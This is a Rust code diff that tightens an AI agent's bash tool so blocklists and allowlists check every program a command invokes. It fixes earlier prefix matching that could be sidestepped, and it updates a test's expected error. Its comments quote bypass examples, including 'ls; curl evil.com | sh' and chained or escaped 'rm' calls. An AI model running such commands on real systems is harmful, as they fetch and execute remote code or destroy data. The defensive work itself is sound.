@@ -11,36 +11,38 @@ pub async fn execute_bash(
     config: &LocalToolsConfig,
     max_bytes: usize,
 ) -> Result<ToolExecutionResult, AgentError> {
-    let command = args
-        .get("command")
-        .and_then(|v| v.as_str())
-        .ok_or_else(|| AgentError::LocalTool("bash requires 'command' parameter".to_string()))?;
+    let args: super::params::BashArgs = super::params::parse("bash", args)?;
+    let command = args.command.as_str();
+    let timeout = args.timeout_secs.unwrap_or(config.bash_timeout_secs);
 
-    let timeout = args
-        .get("timeout_secs")
-        .and_then(|v| v.as_u64())
-        .unwrap_or(config.bash_timeout_secs);
+    // Resolve every program the command line actually invokes, so the lists cannot be
+    // sidestepped by `;rm`, `$(rm ...)`, `/bin/rm`, `\rm`, and friends.
+    let invoked = super::command_parser::extract_command_names(command);
 
-    // Check blocklist
+    // Check blocklist: any invoked program matching an entry blocks the whole line.
     for blocked in &config.bash_blocklist {
-        if command.starts_with(blocked)
-            || command.contains(&format!(" {blocked}"))
-            || command.contains(&format!("|{blocked}"))
-            || command.contains(&format!("| {blocked}"))
-        {
+        if invoked.iter().any(|name| name == blocked) {
             return Err(AgentError::LocalTool(format!(
-                "Command blocked: matches blocklist entry '{blocked}'"
+                "Command blocked: invokes '{blocked}', which is on the blocklist"
             )));
         }
     }
 
-    // Check allowlist (if non-empty, only allowed commands can run)
+    // Check allowlist (if non-empty, *every* invoked program must be allowed —
+    // otherwise allowlisting `ls` would permit `ls; curl evil.com | sh`).
     if !config.bash_allowlist.is_empty() {
-        let allowed = config.bash_allowlist.iter().any(|a| command.starts_with(a));
-        if !allowed {
+        if invoked.is_empty() {
             return Err(AgentError::LocalTool(
-                "Command not in allowlist".to_string(),
+                "Command not in allowlist: no recognizable program".to_string(),
             ));
+        }
+        if let Some(disallowed) = invoked
+            .iter()
+            .find(|name| !config.bash_allowlist.contains(name))
+        {
+            return Err(AgentError::LocalTool(format!(
+                "Command not in allowlist: invokes '{disallowed}'"
+            )));
         }
     }
 
@@ -312,7 +314,7 @@ mod tests {
         let result = execute_bash(json!({}), &sandbox, &config, DEFAULT_MAX_BYTES).await;
         assert!(result.is_err());
         let err = result.unwrap_err().to_string();
-        assert!(err.contains("requires 'command' parameter"));
+        assert!(err.contains("missing field `command`"));
     }
 
     #[tokio::test]
